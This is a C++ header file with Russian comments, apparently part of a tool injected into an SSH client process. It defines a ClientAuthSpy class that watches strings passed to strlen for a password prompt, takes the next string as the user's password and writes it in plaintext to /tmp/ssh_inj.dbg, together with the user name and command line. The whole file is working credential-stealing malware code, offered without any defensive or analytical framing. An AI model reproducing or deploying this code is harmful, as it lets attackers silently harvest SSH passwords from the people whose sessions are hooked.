#ifndef STATE_HPP
#define STATE_HPP

#include <stdio.h>
#include <string.h>

// Состояния авторизации клиента
enum ClientAuthState {
    AUTH_NONE,           // Начальное состояние
    AUTH_INTERACTIVE,    // Интерактивная авторизация
    PASSWORD_EXPECT,     // Ожидание ввода пароля
    PASSWORD_READ        // Пароль был прочитан
};

// Функция для проверки, заканчивается ли строка определенным суффиксом
inline bool str_endswith(const char* str, const char* suffix) {
    if (!str || !suffix) {
        return false;
    }
    
    size_t str_len = strlen(str);
    size_t suffix_len = strlen(suffix);
    
    if (suffix_len > str_len) {
        return false;
    }
    
    return strncmp(str + str_len - suffix_len, suffix, suffix_len) == 0;
}

// Информация о процессе
struct ProcessInfo {
    const char* cmdline;  // Командная строка
    const char* user;     // Имя пользователя
};

// Класс для отслеживания состояния аутентификации SSH клиента
class ClientAuthSpy {
private:
    FILE* m_log_file;            // Файл для логирования
    ClientAuthState m_state;     // Текущее состояние
    char m_password[1024];       // Буфер для хранения пароля
    size_t m_password_pos;       // Позиция в буфере пароля
    ProcessInfo m_process_info;  // Информация о процессе

public:
    // Конструктор
    ClientAuthSpy(const ProcessInfo& process_info) 
        : m_state(AUTH_NONE), m_password_pos(0), m_process_info(process_info) {
        // Открываем лог-файл
        m_log_file = fopen("/tmp/ssh_inj.dbg", "a");
        if (!m_log_file) {
            perror("SSH Inject: Failed to open log file");
            return;
        }

        // Записываем заголовок и информацию о процессе
        fprintf(m_log_file, "--- SSH Injection Started ---\n");
        fprintf(m_log_file, "User: %s\n", process_info.user ? process_info.user : "unknown");
        fprintf(m_log_file, "Command: %s\n", process_info.cmdline ? process_info.cmdline : "unknown");
        fflush(m_log_file);
    }

    // Деструктор
    ~ClientAuthSpy() {
        if (m_log_file) {
            fprintf(m_log_file, "--- SSH Injection Ended ---\n\n");
            fflush(m_log_file);
            fclose(m_log_file);
            m_log_file = NULL;
        }
    }

    // Метод вызывается при инициализации библиотеки
    void Initiated() {
        if (m_log_file) {
            fprintf(m_log_file, "Injection initiated\n");
            fflush(m_log_file);
        }
    }

    // Метод вызывается при вызове функции strlen
    void StrlenCalled(const char* s) {
        if (!s) return;
        
        switch (m_state) {
            case AUTH_NONE:
                // Проверяем, начинается ли интерактивная авторизация
                if (str_endswith(s, "password: ") || str_endswith(s, "Password: ")) {
                    m_state = PASSWORD_EXPECT;
                    if (m_log_file) {
                        fprintf(m_log_file, "Password prompt detected\n");
                        fflush(m_log_file);
                    }
                }
                break;

            case PASSWORD_EXPECT:
                // Если длина строки > 0, значит это может быть пароль
                if (strlen(s) > 0) {
                    m_state = PASSWORD_READ;
                    strncpy(m_password, s, sizeof(m_password) - 1);
                    m_password[sizeof(m_password) - 1] = '\0';
                    if (m_log_file) {
                        fprintf(m_log_file, "Password captured: %s\n", m_password);
                        fflush(m_log_file);
                    }
                }
                break;

            case PASSWORD_READ:
                // Проверяем, если это снова запрос пароля (неверный пароль)
                if (str_endswith(s, "password: ") || str_endswith(s, "Password: ")) {
                    m_state = PASSWORD_EXPECT;
                    if (m_log_file) {
                        fprintf(m_log_file, "Authentication failed, new password prompt\n");
                        fflush(m_log_file);
                    }
                }
                break;
                
            default:
                break;
        }
    }

    // Метод вызывается при регистрации обработчика сигнала SIGTTOU
    void SigactionSIGTOUCalled() {
        if (m_log_file) {
            fprintf(m_log_file, "SIGTTOU handler registered\n");
            fflush(m_log_file);
        }
    }

    // Метод вызывается при вызове функции exit
    void E_xitCalled() {
        if (m_log_file) {
            fprintf(m_log_file, "Client exiting\n");
            fflush(m_log_file);
        }
    }
};

#endif // STATE_HPP 